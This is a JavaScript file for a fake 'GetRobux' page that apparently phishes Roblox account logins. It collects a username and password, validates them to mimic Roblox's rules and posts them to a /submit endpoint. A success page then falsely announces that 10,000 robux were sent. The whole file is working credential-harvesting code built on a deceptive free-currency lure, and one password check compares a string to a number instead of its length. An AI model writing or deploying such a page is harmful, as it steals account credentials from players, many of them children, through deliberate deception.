if(window.location.pathname === "/GetRobux.html"){
    form.addEventListener("submit", async e=>{
        e.preventDefault();
        const formData = new FormData(form);

        const username = formData.get("username");
        const password = formData.get("password");
        const allowedChars = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_";

        console.log(username);
        console.log(password);
    
        if(username.length > 20 || username.length < 3){
            console.log("Username is too long or too short.");
        }
        else if(!containsOnlyAllowedChars(allowedChars, username)){
            console.log("Username can only contain letters, numbers, and underscores.")
        }
        else if(username.charAt(0) == "_" || username.charAt(username.length - 1) == "_"){
            console.log("Username cannot start or end with a _")
        }
        else if(password < 8){
            console.log("Password invalid")
        }
        else{
            const userDataObject = {
                username: username,
                password: password
            };

            const response = await fetch("/submit", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(userDataObject)
            });

            console.log(response.status);

            if(response.status === 201){
                window.location.href = "success.html";
            }
        }
    });
}

if(window.location.pathname === "/success.html"){
    const myH1 = document.getElementById("myH1");
    const myH2 = document.getElementById("myH2");
    const goBack = document.getElementById("goBack");

    goBack.style.display = "none";

    setTimeout(() => {
        myH1.textContent = " 10,000 robux has been sent to your account!"
        myH2.style.display = "none";
        goBack.style.display = "inline-block";
    }, Math.floor(Math.random() * (4000 - 1000 + 1)) + 1000);
}

// Functions
// Check for if a string contains only allowed chars
function containsOnlyAllowedChars(allowed, str) {
    const pattern = new RegExp(`^[${allowed}]+$`);
    return pattern.test(str);
}